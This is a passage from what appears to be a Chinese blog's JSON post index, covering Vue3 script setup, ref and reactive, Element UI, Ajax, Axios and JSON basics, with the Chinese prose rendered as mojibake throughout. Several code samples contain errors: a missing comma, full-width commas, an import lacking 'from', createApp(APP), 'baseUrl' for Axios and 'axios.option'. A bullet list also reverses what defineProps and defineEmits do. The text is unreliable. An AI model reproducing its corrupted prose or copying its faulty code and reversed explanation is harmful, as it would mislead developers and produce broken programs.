htmlæ¨¡æ¿\nâ”œâ”€â”€ src\nâ”‚Â Â  â”œâ”€â”€ App.vue     # å…¥å£é¡µé¢,æ”¾æ¯ä¸ªé¡µé¢éƒ½æœ‰çš„å†…å®¹\nâ”‚Â Â  â”œâ”€â”€ assets      # ä¸»é¢˜ å­—ä½“ç­‰é™æ€èµ„æº\nâ”‚Â Â  â”œâ”€â”€ components  # å…¨å±€å…¬ç”¨ç»„ä»¶\nâ”‚Â Â  â”œâ”€â”€ main.js     # å…¥å£æ–‡ä»¶ åŠ è½½ç»„ä»¶ åˆå§‹åŒ–ç­‰\nâ”‚Â Â  â”œâ”€â”€ router      # è·¯ç”±\nâ”‚Â Â  â””â”€â”€ views       # å•ä¸ªé¡µé¢å†…å®¹\nâ””â”€â”€ vue.config.js    # vue-cli é…ç½®\n```\n\n## Vue3\n\n### script setup\n\nå®ƒæ˜¯ Vue3 çš„ä¸€ä¸ªæ–°è¯­æ³•ç³–ï¼Œåœ¨ `setup` å‡½æ•°ä¸­ã€‚æ‰€æœ‰ ES æ¨¡å—å¯¼å‡ºéƒ½è¢«è®¤ä¸ºæ˜¯æš´éœ²ç»™ä¸Šä¸‹æ–‡çš„å€¼ï¼Œå¹¶åŒ…å«åœ¨ setup() è¿”å›å¯¹è±¡ä¸­ã€‚ç›¸å¯¹äºä¹‹å‰çš„å†™æ³•ï¼Œä½¿ç”¨åï¼Œè¯­æ³•ä¹Ÿå˜å¾—æ›´ç®€å•ã€‚\n\nä½¿ç”¨æ–¹å¼æå…¶ç®€å•ï¼Œä»…éœ€è¦åœ¨ `script` æ ‡ç­¾åŠ ä¸Š `setup` å…³é”®å­—å³å¯ã€‚ç¤ºä¾‹ï¼š\n\n```javascript\n<script setup></script>\n```\n\n#### å±æ€§å’Œæ–¹æ³•æ— éœ€è¿”å›\n\nè¿™å¯èƒ½æ˜¯å¸¦æ¥çš„è¾ƒå¤§ä¾¿åˆ©ä¹‹ä¸€ï¼Œåœ¨ä»¥å¾€çš„å†™æ³•ä¸­ï¼Œå®šä¹‰æ•°æ®å’Œæ–¹æ³•ï¼Œéƒ½éœ€è¦åœ¨ç»“å°¾ return å‡ºå»ï¼Œæ‰èƒ½åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ã€‚åœ¨ script setup ä¸­ï¼Œå®šä¹‰çš„å±æ€§å’Œæ–¹æ³•æ— éœ€è¿”å›ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼\n\n```html\n<!--ä¸ä½¿ç”¨script setup-->\n<template>\n  <div>\n   \t<p>My name is {{name}}</p>\n    <p>sex is {{sex}}</p>\n  </div>\n</template>\n\n<script>\n\timport { ref } from 'vue';\n  export default {\n    name:'ç»„ä»¶å'\n    setup(){\n      const name = ref('Tom')\n      const sex = ref('ç”·')\n      return{\n\t\t\t\tnameï¼Œ\n        sexï¼Œ\n      }\n    }\n\t} \n</script>\n```\n\n```html\n<!--ä½¿ç”¨script setup-->\n<template>\n  <div>\n   \t<p>My name is {{name}}</p>\n    <p>sex is {{sex}}</p>\n  </div>\n</template>\n\n<script setup>\nimport { ref } from 'vue';\nconst name = ref('Tom')\nconst sex = ref('ç”·')\n</script>\n```\n\n#### ç»„ä»¶è‡ªåŠ¨æ³¨å†Œ\n\nåœ¨ script setup ä¸­ï¼Œå¼•å…¥çš„ç»„ä»¶å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œæ— éœ€å†é€šè¿‡`components`è¿›è¡Œæ³¨å†Œ\n\n```html\n<!--ä¸ä½¿ç”¨script setup-->\n<template>\n  <Header/>\n  <Footer/>   \n</template>\n \n<script>\nimport Header from '@/components/Header.vue'\nimport Footer from '@/components/Footer.vue'\nexport default {\n  components: {\n    Header,\n    Footer,\n  }\n} \n</script>\n```\n\n```html\n<!--ä½¿ç”¨script setup-->\n<template>\n  <Header/>\n  <Footer/>   \n</template>\n \n<script setup>\nimport Header from '@/components/Header.vue'\nimport Footer from '@/components/Footer.vue'\n</script>\n```\n\n#### æ— éœ€æŒ‡å®šç»„ä»¶name\n\næ— éœ€æŒ‡å®šå½“å‰ç»„ä»¶çš„åå­—ï¼Œå®ƒä¼šè‡ªåŠ¨ä»¥æ–‡ä»¶åä¸ºä¸»ï¼Œä¹Ÿå°±æ˜¯ä¸ç”¨å†å†™`name`å±æ€§äº†ã€‚å¦‚æœéœ€è¦å®šä¹‰ç±»ä¼¼ name çš„å±æ€§ï¼Œå¯ä»¥å†åŠ ä¸ªå¹³çº§çš„ script æ ‡ç­¾ï¼Œåœ¨é‡Œé¢å®ç°å³å¯ã€‚\n\n```html\n<!--ä¸ä½¿ç”¨script setup-->\n<template>\n<el-footer class=\"footer\"> \n    <span>æˆ‘æ˜¯é¡µåº•</span> \n </el-footer>\n</template>\n\n\n<script>\nexport default{\n    name:'Footer',\n}\n</script>\n```\n\n```html\n<!--ä½¿ç”¨script setup-->\n<template>\n<el-footer class=\"footer\"> \n    <span>æˆ‘æ˜¯é¡µåº•</span> \n </el-footer>\n</template>\n\n<script setup>\n</script>\n```\n\n\n\n#### ä½¿ç”¨ props\n\né€šè¿‡`defineProps`æŒ‡å®šå½“å‰ props ç±»å‹ï¼Œè·å¾—ä¸Šä¸‹æ–‡çš„propså¯¹è±¡ã€‚ç¤ºä¾‹ï¼š\n\n```html\n<script setup>\n  import { defineProps } from 'vue'\n  const props = defineProps({\n  title: String,\n  })\n</script>\n```\n\n#### ä½¿ç”¨ emits\n\nä½¿ç”¨`defineEmit`å®šä¹‰å½“å‰ç»„ä»¶å«æœ‰çš„äº‹ä»¶ï¼Œå¹¶é€šè¿‡è¿”å›çš„ä¸Šä¸‹æ–‡å»æ‰§è¡Œ emitã€‚ç¤ºä¾‹ï¼š\n\n```html\n<script setup>\n  import { defineEmits } from 'vue'\n  const emit = defineEmits(['change', 'delete'])\n</script>\n```\n\n#### è·å– slots å’Œ attrs\n\nå¯ä»¥é€šè¿‡`useContext`ä»ä¸Šä¸‹æ–‡ä¸­è·å– slots å’Œ attrsã€‚ä¸è¿‡ææ¡ˆåœ¨æ­£å¼é€šè¿‡åï¼ŒåºŸé™¤äº†è¿™ä¸ªè¯­æ³•ï¼Œè¢«æ‹†åˆ†æˆäº†`useAttrs`å’Œ`useSlots`ã€‚ç¤ºä¾‹ï¼š\n\n```html\n<!--æ—§-->\n<script setup>\n  import { useContext } from 'vue'\n  const { slots, attrs } = useContext()\n</script>\n\n<!--æ–°-->\n<script setup>\n  import { useAttrs, useSlots } from 'vue'\n  const attrs = useAttrs()\n  const slots = useSlots()\n</script>\n```\n\n#### çˆ¶å­ç»„ä»¶ä¼ å€¼\n\n- å­ç»„ä»¶è·å–åˆ°çˆ¶ç»„ä»¶çš„å€¼ç”¨defineEmit\n- å­ç»„ä»¶ç»™çˆ¶ç»„ä»¶ä¼ å€¼ç”¨defineProps\n- å­ç»„ä»¶æš´éœ²è‡ªå·±çš„æ•°æ®å’Œæ–¹æ³•ç”¨defineExpose\n\n##### defineEmit\n\n##### defineProps\n\n##### defineExpose\n\nä¼ ç»Ÿçš„å†™æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨çˆ¶ç»„ä»¶ä¸­ï¼Œé€šè¿‡ ref å®ä¾‹çš„æ–¹å¼å»è®¿é—®å­ç»„ä»¶çš„å†…å®¹ï¼Œä½†åœ¨ script setup ä¸­ï¼Œè¯¥æ–¹æ³•å°±ä¸èƒ½ç”¨äº†ï¼Œsetup ç›¸å½“äºæ˜¯ä¸€ä¸ªé—­åŒ…ï¼Œé™¤äº†å†…éƒ¨çš„ `template`æ¨¡æ¿ï¼Œè°éƒ½ä¸èƒ½è®¿é—®å†…éƒ¨çš„æ•°æ®å’Œæ–¹æ³•ã€‚å¦‚æœéœ€è¦å¯¹å¤–æš´éœ² setup ä¸­çš„æ•°æ®å’Œæ–¹æ³•ï¼Œéœ€è¦ä½¿ç”¨ defineExpose APIã€‚\n\n```html\n//child.vue\n<template>\n    <div>{{num}}</div>\n</template>\n\n<script setup>\n    import {ref,defineExpose} from 'vue'\n    const num = ref(123)\n    defineExpose({\n        num\n    })\n</script>\n\n\n//father.vue\n<template>\n    <div>\n        <Child ref=\"child\"></Child>\n    </div>\n</template>\n\n<script setup>\nimport {ref} from 'vue'\nimport Child from './child.vue'\nconst child = ref(null)\nsetTimeout (() => {\n    console.log(child.value.num++)\n},1000)\n</script>\n```\n\n### ref & reactive\n\nVue3 ä¸­ä¸»è¦ç”¨ reactive å’Œ ref è¿›è¡Œå“åº”æ•°æ®çš„ç›‘å¬ã€‚ä»–ä¿©çš„åŒºåˆ«åœ¨äºï¼š\n\n- â‘ reactiveä¸­å¿…é¡»å­˜æ”¾å¯¹è±¡ï¼ˆjsonã€æ•°ç»„ç­‰ï¼‰ï¼Œä¸èƒ½å­˜æ”¾åŸºæœ¬æ•°æ®ç±»å‹\n\n- â‘¡refåˆ™å¯ä»¥å­˜æ”¾åŸºæœ¬æ•°æ®ç±»å‹ã€æ³¨ï¼šrefæœ¬è´¨è¿˜æ˜¯reactiveã€‘\n\n```javascript\nlet a = reactive({\n  name:'Tom',\n  sex:'man'\n});\n\nlet b = ref(5);\n```\n\n#### ref\n\n**åŠŸèƒ½**\n\n- 1.åŸºæœ¬ç±»å‹å°è£…ï¼Œä½¿æ•°æ®å“åº”å¼\n- 2.æ¨¡æ¿refï¼Œè·å–domå…ƒç´ èŠ‚ç‚¹\n\n\n\n**2.refå±æ€§è·å–domå…ƒç´ **\n\nåœ¨`vue2.x`ä¸­ï¼Œå¯ä»¥é€šè¿‡ç»™å…ƒç´ æ·»åŠ `ref='xxx'`å±æ€§ï¼Œç„¶ååœ¨ä»£ç ä¸­é€šè¿‡`this.$refs.xxx`è·å–åˆ°å¯¹åº”çš„å…ƒç´ \n\nç„¶è€Œåœ¨`vue3`ä¸­æ—¶æ²¡æœ‰`$refs`è¿™ä¸ªä¸œè¥¿çš„ï¼Œå› æ­¤`vue3`ä¸­é€šè¿‡`ref`å±æ€§è·å–å…ƒç´ å°±ä¸èƒ½æŒ‰ç…§`vue2`çš„æ–¹å¼æ¥è·å–\n `vue3`éœ€è¦å€ŸåŠ©ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼ŒåŸå› å¾ˆç®€å•ï¼Œåœ¨`setup`æ‰§è¡Œæ—¶ï¼Œ`template`ä¸­çš„å…ƒç´ è¿˜æ²¡æŒ‚è½½åˆ°é¡µé¢ä¸Šï¼Œæ‰€ä»¥å¿…é¡»åœ¨`mounted`ä¹‹åæ‰èƒ½è·å–åˆ°å…ƒç´ ã€‚\n\n```html\n<template>\n  <div ref='box'>I am DIV</div>\n</template>\n<script>\nimport {ref,onMounted}\nexport default{\n  setup(){\n    let box = ref(null);\n    onMounted(()=>{\n      console.log(box.value)\n    });\n    return {box}\n  }\n}\n</script>\n```\n\nå¦‚ä¸Šä»£ç ï¼Œ`vue3`ä¸­ï¼Œæ‰€æœ‰ç”Ÿå‘½å‘¨æœŸæ–¹æ³•éƒ½æŠ½ç¦»å‡ºå»äº†ï¼Œéœ€è¦ç”¨æ—¶ç›´æ¥`import`ã€‚è¿™é‡Œå¯¼å…¥äº†ä¸€ä¸ª`onMounted`\n å½“ç•Œé¢æŒ‚è½½å‡ºæ¥çš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨æ‰§è¡Œ`onMounted`çš„å›è°ƒå‡½æ•°ï¼Œé‡Œå¤´å°±å¯ä»¥è·å–åˆ°domå…ƒç´ \n\nvue3å¦‚ä½•é€šè¿‡refå±æ€§è·å–ç•Œé¢ä¸Šçš„å…ƒç´ ?\n åœ¨ template ä¸­çš„å†™æ³•è·Ÿ Vue2 ä¸€æ ·ï¼Œç»™å…ƒç´ æ·»åŠ ä¸ª ref='xxx'ï¼Œ åœ¨ setup ä¸­ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªå“åº”å¼æ•°æ®ï¼Œå¹¶ä¸”è¦æŠŠå“åº”å¼æ•°æ®æš´éœ²å‡ºå»ï¼Œå½“å…ƒç´ è¢«åˆ›å»ºå‡ºæ¥çš„æ—¶å€™ï¼Œå°±ä¼šç»™å¯¹åº”çš„å“åº”æ•°æ®èµ‹å€¼ï¼Œå½“å“åº”å¼æ•°æ®è¢«èµ‹å€¼ä¹‹åï¼Œå°±å¯ä»¥åˆ©ç”¨ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼Œåœ¨ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ä¸­è·å–å¯¹åº”çš„å“åº”å¼æ•°æ®ï¼Œå³DOMå…ƒç´ \n\n\n\n\n\n\n\n## Element UI\n\nElement å®˜ç½‘ï¼š[Vue 2 UI æ¡†æ¶ | Element](https://element.eleme.cn/#/zh-CN)ã€[Vue 3 UI æ¡†æ¶ | Element Plus](https://element-plus.gitee.io/zh-CN/)\n\n### å¿«é€Ÿå…¥é—¨\n\n1ã€å¼•å…¥èµ„æº\n\n```html\n<!-- å¼•å…¥Vue -->\n<script src=\"https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js\"></script>\n<!-- å¼•å…¥æ ·å¼ -->\n<link rel=\"stylesheet\" href=\"https://unpkg.com/element-ui/lib/theme-chalk/index.css\">\n<!-- å¼•å…¥ç»„ä»¶åº“ -->\n<script src=\"https://unpkg.com/element-ui/lib/index.js\"></script>\n```\n\n2ã€åˆ›å»º Vue å¯¹è±¡\n\n```html\n<script>\n    new Vue({\n        el:\"#app\"\n    })\n</script>\n```\n\n3ã€ä½¿ç”¨Elementç»„ä»¶ä»£ç \n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<div id=\"app\">\n    <!-- elementä»£ç  -->\n    <el-row>\n     \t<el-button>é»˜è®¤æŒ‰é’®</el-button>\n        <el-button type=\"primary\">ä¸»è¦æŒ‰é’®</el-button>\n        <el-button type=\"success\">æˆåŠŸæŒ‰é’®</el-button>\n        <el-button type=\"info\">ä¿¡æ¯æŒ‰é’®</el-button>\n        <el-button type=\"warning\">è­¦å‘ŠæŒ‰é’®</el-button>\n        <el-button type=\"danger\">åˆ é™¤</el-button>\n    </el-row>\n</div>\n\n<!-- å¼•å…¥Vue -->\n<script src=\"https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js\"></script>\n<!-- å¼•å…¥æ ·å¼ -->\n<link rel=\"stylesheet\" href=\"https://unpkg.com/element-ui/lib/theme-chalk/index.css\">\n<!-- å¼•å…¥ç»„ä»¶åº“ -->\n<script src=\"https://unpkg.com/element-ui/lib/index.js\"></script>\n\n<script>\n    new Vue({\n        el:\"#app\"\n    })\n</script>\n\n</body>\n</html>\n```\n\n\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Web"],"categories":["JavaWeb"]},{"title":"Ajax & Axios & Json","url":"/posts/16553.html","content":"\n## Ajax\n\n### ç®€ä»‹\n\nAJAX (Asynchronous JavaScript And XML)ï¼šå¼‚æ­¥çš„ JavaScript å’Œ XMLã€‚\n\nAJAX æœ‰ä¸¤ä¸ªä½œç”¨ï¼š\n\n- 1ã€ä¸æœåŠ¡å™¨è¿›è¡Œæ•°æ®äº¤æ¢ã€‚å¯ä»¥ä½¿ç”¨ Ajax å’ŒæœåŠ¡å™¨è¿›è¡Œé€šä¿¡\n\n![](https://img.jwt1399.top/img/image-20220427141958390.png)\n\n- 2ã€å¼‚æ­¥äº¤äº’ã€‚å¯ä»¥åœ¨ä¸é‡æ–°åŠ è½½æ•´ä¸ªé¡µé¢çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä¸æœåŠ¡å™¨äº¤æ¢æ•°æ®å¹¶æ›´æ–°éƒ¨åˆ†ç½‘é¡µå†…å®¹ã€‚\n\n### åŒæ­¥å’Œå¼‚æ­¥\n\n**åŒæ­¥å‘é€è¯·æ±‚è¿‡ç¨‹**\n\n![](https://img.jwt1399.top/img/image-20220427142230880.png)\n\næµè§ˆå™¨é¡µé¢åœ¨å‘é€è¯·æ±‚ç»™æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨é¡µé¢ä¸èƒ½åšå…¶ä»–çš„æ“ä½œã€‚åªèƒ½ç­‰åˆ°æœåŠ¡å™¨å“åº”ç»“æŸåï¼Œæµè§ˆå™¨é¡µé¢æ‰èƒ½ç»§ç»­åšå…¶ä»–çš„æ“ä½œã€‚\n\n**å¼‚æ­¥å‘é€è¯·æ±‚è¿‡ç¨‹**\n\n![](https://img.jwt1399.top/img/image-20220427142237621.png)\n\næµè§ˆå™¨é¡µé¢å‘é€è¯·æ±‚ç»™æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨é¡µé¢è¿˜å¯ä»¥åšå…¶ä»–çš„æ“ä½œã€‚\n\n### å¿«é€Ÿå…¥é—¨\n\n#### æœåŠ¡ç«¯å®ç°\n\n```java\n@WebServlet(\"/ajaxServlet\")\npublic class AjaxServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        //å“åº”æ•°æ®\n        response.getWriter().write(\"hello Ajax~\");\n    }\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        this.doGet(request, response);\n    }\n}\n```\n\n#### å®¢æˆ·ç«¯å®ç°\n\nåœ¨ webapp ä¸‹åˆ›å»ºåä¸º ajax.html çš„é¡µé¢ï¼Œåœ¨è¯¥é¡µé¢ä¹¦å†™ Ajax ä»£ç \n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n<script>\n    //1. åˆ›å»ºæ ¸å¿ƒå¯¹è±¡,ä¸åŒçš„æµè§ˆå™¨åˆ›å»ºçš„å¯¹è±¡æ˜¯ä¸åŒçš„\n    var xhttp;\n    if (window.XMLHttpRequest) {\n        xhttp = new XMLHttpRequest();\n    } else {\n        // code for IE6, IE5\n        xhttp = new ActiveXObject(\"Microsoft.XMLHTTP\");\n    }\n    //2. å‘é€è¯·æ±‚\n    xhttp.open(\"GET\", \"http://localhost:8080/ajax-demo/ajaxServlet\");//å»ºç«‹è¿æ¥\n    xhttp.send();//å‘é€è¯·æ±‚\n    //3. è·å–å“åº”\n    xhttp.onreadystatechange = function() {\n        if (this.readyState == 4 && this.status == 200) {\n            //å¤„ç†å“åº”ç»“æœ\n            alert(this.responseText);//å¼¹å‡ºæœåŠ¡ç«¯å“åº”çš„æ•°æ®\n        }\n    };\n</script>\n</body>\n</html>\n```\n\nè¿è¡Œåï¼Œåœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ `http://localhost:8080/ajax-demo/ajax.html` ï¼Œåœ¨ `ajax.html` åŠ è½½çš„æ—¶å€™å°±ä¼šå‘é€ Ajax è¯·æ±‚ï¼Œè·å–æœåŠ¡ç«¯å“åº”çš„æ•°æ®ï¼Œâ€œhello Ajax~â€\n\n## Axios\n\nAxios æ˜¯ä¸€ä¸ªåŸºäº promise çš„ç½‘ç»œè¯·æ±‚åº“ã€‚æœ¬è´¨ä¸Šæ˜¯å¯¹åŸç”Ÿçš„ Ajax è¿›è¡Œå°è£…ï¼Œç®€åŒ–ä»£ç \n\n### åŸºç¡€è¯­æ³•\n\n1ã€å¼•å…¥ axios çš„ js æ–‡ä»¶\n\n```javascript\n<script src=\"js/axios.js\"></script>\n```\n\n2ã€ä½¿ç”¨ axios å‘é€è¯·æ±‚ï¼Œå¹¶è·å–å“åº”ç»“æœ\n\n- å‘é€ get è¯·æ±‚\n\n```javascript\naxios({\n  method:\"get\",\n  url:\"è¯·æ±‚çš„URLåœ°å€?è¯·æ±‚ä½“\"\n  }).then(function (resp){//ç”¨æ¥æŒ‡å®šè¯·æ±‚æˆåŠŸä¹‹åçš„å›è°ƒå‡½æ•°\n  alert(resp.data);//resp æ˜¯è¯·æ±‚æˆåŠŸä¹‹åçš„ç»“æœ\n})\n```\n\n- å‘é€ post è¯·æ±‚\n\n```javascript\naxios({\n  method:\"post\",\n  url:\"è¯·æ±‚çš„URLåœ°å€\",\n  data:\"è¯·æ±‚ä½“\"\n  }).then(function (resp){\n  alert(resp.data);\n});\n```\n\naxios() æ˜¯ç”¨æ¥å‘é€å¼‚æ­¥è¯·æ±‚çš„ï¼Œå°æ‹¬å·ä¸­ä½¿ç”¨ js å¯¹è±¡ä¼ é€’è¯·æ±‚ç›¸å…³çš„å‚æ•°ï¼š\n\n| å‚æ•°       | æè¿°                   |\n| ---------- | ---------------------- |\n| method     | è¯·æ±‚ç±»å‹               |\n| url        | è¯·æ±‚çš„URLåœ°å€          |\n| data       | postè¯·æ±‚ä½“             |\n| then(å‡½æ•°) | è¯·æ±‚æˆåŠŸä¹‹åçš„å›è°ƒå‡½æ•° |\n\n### å¿«é€Ÿå…¥é—¨\n\n#### åç«¯å®ç°\n\nå®šä¹‰ä¸€ä¸ªç”¨äºæ¥æ”¶è¯·æ±‚çš„servlet\n\n```java\n@WebServlet(\"/axiosServlet\")\npublic class AxiosServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        System.out.println(\"get...\");\n        //1. æ¥æ”¶è¯·æ±‚å‚æ•°\n        String username = request.getParameter(\"username\");\n        System.out.println(username);\n        //2. å“åº”æ•°æ®\n        response.getWriter().write(\"hello Axios~\");\n    }\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        System.out.println(\"post...\");\n        this.doGet(request, response);\n    }\n}\n```\n\n#### å‰ç«¯å®ç°\n\næ–°å»º axios.html å¹¶å¼•å…¥ axios.js\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>Title</title>\n</head>\n<body>\n<script src=\"js/axios.js\"></script>\n<script>\n  //1. get\n  axios({\n  method:\"get\",\n  url:\"http://localhost:8080/axois-demo/axiosServlet?username=Tom\"\n  }).then(function (resp) {\n  alert(resp.data);\n  })\n  \n  //2. post\n  /*axios({\n    method:\"post\",\n    url:\"http://localhost:8080/axois-demo/axiosServlet\",\n    data:\"username=Tom\"\n  }).then(function (resp) {\n    alert(resp.data);\n  })*/\n</script>\n</body>\n</html>\n```\n\nè¿è¡Œåï¼Œåœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ `http://localhost:8080/axois-demo/axios.html` ï¼Œåœ¨ `axios.html` åŠ è½½çš„æ—¶å€™å°±ä¼šå‘é€ Axios è¯·æ±‚ï¼Œè·å–æœåŠ¡ç«¯å“åº”çš„æ•°æ®ï¼Œå¼¹å‡ºâ€œhello Axios~â€\n\n### è¯·æ±‚æ–¹æ³•åˆ«å\n\nä¸ºäº†æ–¹ä¾¿æ›´åŠ ç®€åŒ–ä»£ç ï¼Œ Axios ä¸ºæ‰€æœ‰æ”¯æŒçš„è¯·æ±‚æ–¹æ³•æä¾›äº†åˆ«åã€‚\n\n- get è¯·æ±‚ ï¼š axios.get(url[,config])\n- post è¯·æ±‚ï¼š axios.post(url[,data[,config])\n\n- delete è¯·æ±‚ ï¼š axios.delete(url[,config])\n\n- head è¯·æ±‚ ï¼š axios.head(url[,config])\n\n- options è¯·æ±‚ ï¼š axios.option(url[,config])\n\n- put è¯·æ±‚ï¼š axios.put(url[,data[,config])\n\n- patch è¯·æ±‚ï¼š axios.patch(url[,data[,config])\n\n**getè¯·æ±‚å¯æ”¹ä¸ºï¼š**\n\n```javascript\naxios.get(\"/axios-demo/axiosServlet?username=Tom\").then(function(resp) {\n    alert(resp.data);\n});\n```\n\n**postè¯·æ±‚å¯æ”¹ä¸ºï¼š**\n\n```javascript\n axios.post(\"/axios-demo/axiosServlet\",\"username=Tom\").then(function(resp) {\n    alert(resp.data);\n  })\n```\n\n### Vue3ä½¿ç”¨Axios\n\nstep1. ä½¿ç”¨npmå®‰è£…axios\n\n```bash\nnpm install axios --save\n```\n\nstep2. æˆ‘ä»¬å°†è¦ä½¿ç”¨çš„axioså®ä¾‹å•ç‹¬ç¼–å†™æˆä¸€ä¸ªjsæ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹å¯ä»¥å»ºç«‹åœ¨**src/utils/**ï¼ˆè‡ªå·±é€‰æ‹©å»ºç«‹åœ¨ä»€ä¹ˆåœ°æ–¹ï¼‰ã€‚å‘½åä¸ºï¼š `axios.js`\n\n```javascript\nimport axios from 'axios'\n\n//ä½¿ç”¨axiosä¸‹é¢çš„create([config])æ–¹æ³•åˆ›å»ºaxioså®ä¾‹ï¼Œå…¶ä¸­configå‚æ•°ä¸ºaxiosæœ€åŸºæœ¬çš„é…ç½®ä¿¡æ¯ã€‚\nconst API = axios.create({\n\tbaseUrl:'http://localhost:8080' ,//è¯·æ±‚åç«¯æ•°æ®çš„åŸºæœ¬åœ°å€ï¼Œè‡ªå®šä¹‰\n\theaders: {\n\t\t'Content-Type': 'application/x-www-form-urlencoded',\n\t},\n\ttimeout: 2000                   //è¯·æ±‚è¶…æ—¶è®¾ç½®ï¼Œå•ä½ms\n})\n\n//å¯¼å‡ºæˆ‘ä»¬å»ºç«‹çš„axioså®ä¾‹æ¨¡å—ï¼ŒES6 exportç”¨æ³•\nexport default API\n```\n\nstep3. ç„¶ååœ¨**main.js**ä¸­å¯¼å…¥æˆ‘ä»¬ç¼–å†™**axios.js**æ–‡ä»¶ï¼Œå…¨å±€é…ç½®ä¸€ä¸‹axiosçš„å¼•ç”¨ã€‚\n\n```java\n//main.js\nimport { createApp } from 'vue'\nimport App from './App.vue'\nimport axios from '@/utils/axios.js'\n\nconst app = createApp(APP);   //å»ºç«‹ä¸€ä¸ªvue3app\napp.mount('#app');            //å°†è¿™ä¸ªvue3appå…¨å±€æŒ‚è½½åˆ°#appå…ƒç´ ä¸Š\napp.config.globalProperties.$axios=axios;  //é…ç½®axiosçš„å…¨å±€å¼•ç”¨\n```\n\n\n\n## Json\n\n### ç®€ä»‹\n\nJSONï¼ˆJavaScript Object Notation ï¼‰ï¼šJavaScript å¯¹è±¡è¡¨ç¤ºæ³•\n\nä½œç”¨ï¼šç”±äºå…¶è¯­æ³•æ ¼å¼ç®€å•ï¼Œå±‚æ¬¡ç»“æ„é²œæ˜ï¼Œç°å¤šç”¨äºä½œä¸ºæ•°æ®è½½ä½“ï¼Œåœ¨ç½‘ç»œä¸­è¿›è¡Œæ•°æ®ä¼ è¾“ã€‚\n\nJavaScript å¯¹è±¡æ ¼å¼ï¼š\n\n```javascript\n{\n  name:\"zhangsan\",\n  age:23,\n  city:\"åŒ—äº¬\"\n}\n```\n\nXML æ ¼å¼ï¼š\n\n```xml\n<student>\n  <name>å¼ ä¸‰</name>\n  <age>23</age>\n  <city>åŒ—äº¬</city>\n</student>\n```\n\nJSON æ ¼å¼ï¼š\n\n```json\n{\n  \"name\":\"zhangsan\",\n  \"age\":23,\n  \"city\":\"åŒ—äº¬\"\n}\n```\n\nå¯¹æ¯”åå°±ä¼šå‘ç° JSON æ ¼å¼æ›´ç®€å•ï¼ŒJSON æ ¼å¼å’Œ JS å¯¹è±¡æ ¼å¼ç‰¹åˆ«åƒã€‚JSON æ ¼å¼ä¸­çš„é”®è¦æ±‚å¿…é¡»ä½¿ç”¨åŒå¼•å·æ‹¬èµ·æ¥ã€‚\n\n### åŸºç¡€è¯­æ³•\n\nJSON æœ¬è´¨å°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¯¥å­—ç¬¦ä¸²å†…å®¹æ˜¯æœ‰ä¸€å®šçš„æ ¼å¼è¦æ±‚çš„ã€‚ å®šä¹‰æ ¼å¼å¦‚ä¸‹ï¼š\n\n```javascript\nvar å˜é‡å = '{\"key\":value,\"1 key\":value,...}';\n```\n\nJSON çš„é”®è¦æ±‚å¿…é¡»ä½¿ç”¨åŒå¼•å·æ‹¬èµ·æ¥ï¼Œè€Œå€¼æ ¹æ®è¦è¡¨ç¤ºçš„ç±»å‹ç¡®å®šã€‚\n\nvalue çš„æ•°æ®ç±»å‹åˆ†ä¸ºå¦‚ä¸‹\n\n- æ•°å­—ï¼ˆæ•´æ•°æˆ–æµ®ç‚¹æ•°ï¼‰\n\n- å­—ç¬¦ä¸²ï¼ˆä½¿ç”¨åŒå¼•å·æ‹¬èµ·æ¥ï¼‰\n\n- 